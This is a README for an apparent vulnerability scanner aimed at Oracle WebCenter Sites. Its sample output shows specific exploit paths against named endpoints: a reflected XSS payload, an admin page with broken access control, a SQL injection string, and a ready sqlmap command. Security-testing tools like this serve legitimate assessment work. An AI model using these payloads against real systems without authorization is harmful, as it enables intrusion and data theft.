# wcs_scanner
#### WebCenter Sites Vulnerability Scanner

Scan Oracle WebCenter Sites platform looking for its known vulnerabilities.

### Usage
```bash
python3 wcs_scanner.py http://example.com
```

**Example output**
```text
[!] Start scanning http://example.com

[*] Look for default login page
[-] Default login page not found

[*] Testing XSS
[+] Possible XSS found: http://example.com/cs/Satellite?c=qqqq&cid=qqqq&pagename=OpenMarket/Gator/FlexibleAssets/AssetMaker/confirmmakeasset&cs_imagedir=qqq"><script>alert(24)</script>
[...]

[*] Testing Broken Access Control
[+] Possible Broken Access Control found: http://example.com/cs/Satellite?pagename=OpenMarket/Xcelerate/Admin/WebReferences

[*] Testing SQL Injection
[+] Possible SQLi found POST /cs/ContentServer {'_authkey_': '...', 'pagename': 'OpenMarket/Xcelerate/Admin/WebReferences', 'op': 'search', 'urlsToDelete': '', 'resultsPerPage': 25, 'searchChoice': 'webroot', 'searchText': "' or '1'='1 -- "}
[*] You should test this with sqlmap:
sqlmap --dbms Oracle --url http://example.com/cs/ContentServer --data "_authkey_=...&pagename=OpenMarket/Xcelerate/Admin/WebReferences&op=search&urlsToDelete=&resultsPerPage=25&searchChoice=webroot&searchText=*" --cookie "JSESSIONID=..." --technique U

```

## Reference:
- https://outpost24.com/blog/Vulnerabilities-discovered-in-Oracle-WebCenter-Sites
- https://www.exploit-db.com/exploits/44752


### TODO
Nuclei templates for:
- cve-2019-2578
- cve-2019-2579
